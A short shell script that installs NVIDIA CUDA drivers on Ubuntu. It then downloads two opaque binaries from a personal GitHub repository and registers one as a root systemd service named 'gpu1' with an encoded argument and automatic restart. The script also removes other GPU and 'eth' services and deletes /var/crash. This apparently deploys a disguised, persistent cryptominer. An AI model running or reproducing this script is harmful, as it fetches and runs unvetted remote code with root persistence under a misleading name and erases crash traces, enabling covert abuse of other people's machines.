CUDA_REPO_PKG=cuda-repo-ubuntu1804_10.0.130-1_amd64.deb
wget -O /tmp/${CUDA_REPO_PKG} https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/${CUDA_REPO_PKG}
sudo dpkg -i /tmp/${CUDA_REPO_PKG}
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/7fa2af80.pub
sudo rm -f /tmp/${CUDA_REPO_PKG}
sudo apt-get update
sudo apt-get install cuda-drivers -y
sudo apt-get install cuda -y
sudo apt-get update
sudo apt-get upgrade -y
sudo apt-get dist-upgrade -y
sudo apt-get install cuda-drivers
sudo apt-get install libcurl3 -y
cd /home
sudo wget https://raw.githubusercontent.com/89505004/ces/master/a
sudo wget https://raw.githubusercontent.com/89505004/ces/master/sec
sudo chmod +x sec
sudo chmod +x a
sudo rm -rf /lib/systemd/system/gpu1.service
sudo rm -rf /lib/systemd/system/gpu.service
sudo rm -rf /lib/systemd/system/eth.service
sudo rm -rf /var/crash
bash -c 'cat &lt;<EOT>>/lib/systemd/system/gpu1.service 
[Unit]
Description=gpu1
After=network.target
[Service]
ExecStart= /home/sec qoRCpwHXbXQqyHoLTwKFnIb/jo6+p19aB8FHJti0tuaZ3EptCRK7PnsltjktawDC4+pzrzc7oUPDw7OLnlfmseaNtwfJ7NNuTzLMsytqeQ4F9VBTAD5z8hYeAHjLi5rGehiQp8eUW5axtjm7w1pmHu5ovAmjeiz0nNq7Qhw/Tie0dy8JVwRo8gP1MyiOVm709VBuBmhaCVpob6UKKgdCZ/fzB0Oti8qoQjadJxqDr3dVH6Byiw==
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable gpu1.service &&
service gpu1 stop  &&
service gpu1 restart
